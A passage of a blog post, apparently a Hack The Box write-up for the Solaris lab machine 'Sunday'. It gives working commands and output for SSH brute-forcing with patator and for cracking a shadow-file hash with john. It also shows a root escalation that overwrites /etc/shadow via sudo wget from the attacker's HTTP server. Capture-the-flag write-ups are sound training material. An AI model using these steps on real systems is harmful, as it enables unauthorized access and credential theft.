+</code></pre></div>
+
+<h1 id="breaking-in">Breaking in</h1>
+
+<h2 id="ssh-password-guessing">SSH password guessing</h2>
+
+<p>Knowing some usernames, we can go on trying to log into the system.
+For each user, try a few obvious things related to the sun or to Sunday.
+My short list of passwords was:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>admin
+password
+123456
+sunny
+sun
+sunshine
+sunlight
+sunday
+monday
+tuesday
+wednesday
+thursday
+friday
+saturday
+weekend
+</code></pre></div>
+
+<p>Putting usernames into a file &ldquo;usernames.txt&rdquo; and the list above into
+&ldquo;passwords.txt&rdquo;, we can brute force our way in.
+You could try brute-forcing SSH with <a href="https://sectools.org/tool/hydra/">Hydra</a>,
+but for some reason it does not work. After some desperate hours, I&rsquo;ve discovered
+<a href="https://github.com/lanjelot/patator">patator</a> and like to use
+it since then, since it feels more reliable. It can be used on many different services
+including SSH and is very easy to use. Getting into SSH on this box works like
+so:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ ./patator.py ssh_login <span style="color: #f8f8f2">host</span><span style="color: #f92672">=</span><span style="color: #ae81ff">10</span>.10.10.76 <span style="color: #f8f8f2">port</span><span style="color: #f92672">=</span><span style="color: #ae81ff">22022</span> <span style="color: #f8f8f2">user</span><span style="color: #f92672">=</span>FILE0 <span style="color: #f8f8f2">0</span><span style="color: #f92672">=</span>/htb/sunday/usernames.txt <span style="color: #f8f8f2">password</span><span style="color: #f92672">=</span>FILE1 <span style="color: #f8f8f2">1</span><span style="color: #f92672">=</span>/htb/sunday/passwords.txt
+13:40:08 patator    INFO - Starting Patator v0.7 (https://github.com/lanjelot/patator) at 2018-09-15 13:40 EDT
+13:40:08 patator    INFO -
+13:40:08 patator    INFO - code  size    time | candidate                          |   num | mesg
+13:40:08 patator    INFO - -----------------------------------------------------------------------------
+...
+13:40:10 patator    INFO - 1     22     0.164 | sunny:weekend                      |    15 | Authentication failed.
+13:40:11 patator    INFO - 0     19     0.301 | sunny:sunday                       |     8 | SSH-2.0-Sun_SSH_1.3
+13:40:11 patator    INFO - 1     22     0.264 | sunny:sunlight                     |     7 | Authentication failed.
+...
+13:40:13 patator    INFO - Hits/Done/Skip/Fail/Size: 30/30/0/0/30, Avg: 5 r/s, Time: 0h 0m 5s
+</code></pre></div>
+
+<p>All requests return &ldquo;Authentication failed.&rdquo; except for credentials &ldquo;sunny&rdquo; /
+&ldquo;sunday&rdquo;, which give &ldquo;SSH-2.0-Sun_SSH_1.3&rdquo;. This means we found valid login
+credentials.</p>
+
+<h1 id="from-sunny-to-sammy">From sunny to sammy</h1>
+
+<p>We can use our newly found credentials to log in via SSH:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ ssh -p <span style="color: #ae81ff">22022</span> sunny@10.10.10.76
+Password:
+Last login: Wed Sep 12 20:57:00 2018 from 10.10.15.130
+Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
+sunny@sunday:~$
+</code></pre></div>
+
+<p>Starting from here, we could proceed with any of the standard Linux privilege
+escalation scripts. It would likely break for some parts though since Solaris
+is not exactly like Linux, which is why I proceeded with poking around manually
+to start.</p>
+
+<h2 id="rabbit-hole">Rabbit hole</h2>
+
+<p>An easy thing to find is that sunny has sudo execution rights on &ldquo;/root/troll&rdquo;:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>sunny@sunday:~$ sudo -l
+User sunny may run the following commands on this host:
+    (root) NOPASSWD: /root/troll
+
+sunny@sunday:~$ sudo /root/troll
+testing
+uid=0(root) gid=0(root)
+</code></pre></div>
+
+<p>It seems to just print &ldquo;testing&rdquo; and then run <code>id</code>. I did not investigate
+further as the name suggests we won&rsquo;t find anything useful.</p>
+
+<h2 id="cracking-sammy-s-password">Cracking sammy&rsquo;s password</h2>
+
+<p>Instead, look around further and you find a strange folder &ldquo;/backup&rdquo; with a
+file named &ldquo;shadow.backup&rdquo; inside. The content looks like it really is a
+backup of &ldquo;/etc/shadow&rdquo;:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>sunny@sunday:/$ cat /backup/shadow.backup
+...
+sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
+sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
+</code></pre></div>
+
+<p>There are two SHA256 password hashes for users sammy and sunny. We know they are
+SHA256 hashes as they start with &ldquo;$5$&rdquo; (check <a href="https://www.cyberciti.biz/faq/understanding-etcshadow-file/">this page</a>
+for how to read shadow files). Assuming the file contains the current
+passwords, the one for &ldquo;sunny&rdquo; should be &ldquo;sunday&rdquo;. We can verify that by
+regenerating sunny&rsquo;s password hash with the salt &ldquo;iRMbpnBv&rdquo; found in
+the backed-up shadow file:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ mkpasswd -m sha-256 -S iRMbpnBv sunday
+$<span style="color: #ae81ff">5</span><span style="color: #f8f8f2">$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3</span>
+</code></pre></div>
+
+<p>They match. Let&rsquo;s crack sammy&rsquo;s password and hope that it is also still in use.
+Put the password hash &ldquo;$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB&rdquo;
+into a file &ldquo;sammy-hash.txt&rdquo; and run (jumbo)john against the &ldquo;rockyou&rdquo; wordlist:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ john ./sammy-hash.txt  --wordlist<span style="color: #f92672">=</span>/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 128/128 AVX 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 4 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+cooldude!        (?)
+...
+</code></pre></div>
+
+<p>It discovers the format automatically and returns the password after a short
+time. The password is &ldquo;cooldude!&rdquo;</p>
+
+<h1 id="from-sammy-to-root">From sammy to root</h1>
+
+<p>With out new credentials &ldquo;sammy&rdquo; / &ldquo;cooldude!&rdquo;, we can open a new SSH session.
+Remember that sunny was able to run sudo? What about sammy?</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>sammy@sunday:~$ sudo -l
+User sammy may run the following commands on this host:
+    (root) NOPASSWD: /usr/bin/wget
+</code></pre></div>
+
+<p>This is a lot more interesting that the &ldquo;troll&rdquo; thing. With <code>wget -O</code> we can
+download a file and specify a location to write it to. As root, we can
+overwrite pretty much any configuration file. Thus, lot&rsquo;s of different ways to
+get into root exist from here. You could overwrite <code>wget</code> with <code>bash</code>, then run
+it as sammy with sudo. You could overwrite the &ldquo;/etc/sudoers&rdquo; file to add new
+permissions (TODO: possible wihtout restart?). You could overwrite &ldquo;/etc/shadow&rdquo; with a root password you know.
+Probably many more ways exist.</p>
+
+<p>To not destroy the experience of other players, use a non-destructive method.
+I just prepended a line to the backup of &ldquo;etc/shadow&rdquo; to reuse the password
+&ldquo;sunday&rdquo; of sunny for root:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>root:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
+mysql:NP:::::::
+openldap:*LK*:::::::
+webservd:*LK*:::::::
+postgres:NP:::::::
+svctag:*LK*:6445::::::
+nobody:*LK*:6445::::::
+noaccess:*LK*:6445::::::
+nobody4:*LK*:6445::::::
+sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
+sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
+</code></pre></div>
+
+<p>Serve this file with <code>python -m SimpleHTTPServer 8000</code> and then download it
+with sudo as sammy:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>sammy@sunday:~$ sudo wget -O /etc/shadow http://10.10.15.130:8000/shadow
+--17:31:08--  http://10.10.15.130:8000/shadow
+           =&gt; `/etc/shadow&#39;
+Connecting to 10.10.15.130:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 392 [application/octet-stream]
+
+100%[==================================================================================================================&gt;] 392           --.--K/s
+
+17:31:08 (60.37 MB/s) - `/etc/shadow&#39; saved [392/392]
+</code></pre></div>
+
+<p>Now, a simple <code>su -</code> followed by password &ldquo;sunday&rdquo; is enough to become root.</p>
+
+<h1 id="conclusion">Conclusion</h1>
+
+<p>Very nice box with a few brute-forcing challenges and a basic privesc. Nice to
+see an old-school OS, feels very retro :)</p>
+
+<p>Other write-ups for this box:</p>
+
+<ul>
+<li>ippsec video on <a href="https://www.youtube.com/watch?v=xUrq29OTSuM">YouTube</a>.</li>
+<li>Collection of various write-ups, accessible only with the flag:
+<a href="https://github.com/Hackplayers/hackthebox-writeups/tree/master/machines/Sunday">GitHub</a></li>
+<li>Alternative and probably unintended privesc
+<a href="https://epi052.gitlab.io/notes-to-self/blog/2018-09-21-hack-the-box-sunday/">here</a>.
+For some reason, user &ldquo;sammy&rdquo; seems to have a &ldquo;root&rdquo; role assinged in
+&ldquo;/etc/user_attr&rdquo; and you can use a tool named
+<a href="https://docs.oracle.com/cd/E19253-01/816-5165/pfexec-1/">pfexec</a> to run
+commands with these privileges.</li>
+<li>Alternative way to use <code>wget</code> to for privesc but just to extract the flag
+<a href="https://x4nt0n.github.io/writeups/Sunday/">here</a>.
+It seems <code>wget</code> can not just retrieve content but also POST files to your own
+web server, so combined with sudo you can just send the flag to yourself.</li>
+</ul>
+
+    </div>
+    
+    <footer>
+      <hr>
+      <p>
+  Published
+  
+    
+      by <span itemprop="author">Dominic Breuker</span>
+    
+  
+  <time itemprop="datePublished" datetime="2018-09-30T00:00:00&#43;02:00">
+    30 Sep, 2018
+  </time>
+  
+    in <span itemprop="articleSection"><a href="/categories/hackthebox/">hackthebox</a></span>
+  
+  
+    and tagged <a href="/tags/ctf/">ctf</a>, <a href="/tags/hackthebox/">hackthebox</a>, <a href="/tags/infosec/">infosec</a> and <a href="/tags/write-up/">write-up</a>
+  
+  using <span itemprop="wordCount">1675</span> words.
+</p>
+
+      
+
+
+  <aside>
+    <header>Related Content</header>
+    <ul>
+      
+        <li><a href="/post/htb_solidstate/">Hack The Box Write-up - SolidState</a>
+        <time datetime="12M">12 minutes</time>
+      
+        <li><a href="/post/htb_calamity/">Hack The Box Write-up - Calamity</a>
+        <time datetime="10M">10 minutes</time>
+      
+        <li><a href="/post/flaws_cloud_2/">flaws.cloud - Level 2</a>
+        <time datetime="8M">8 minutes</time>
+      
+        <li><a href="/post/stego_book_of_secrets/">Steganography challenge - The Book of Secrets</a>
+        <time datetime="10M">10 minutes</time>
+      
+    </ul>
+  </aside>
+
+
+    </footer>
+  </article>
+</main>
+    <footer>
+  
+
+</footer>
+  </body>
+</html>
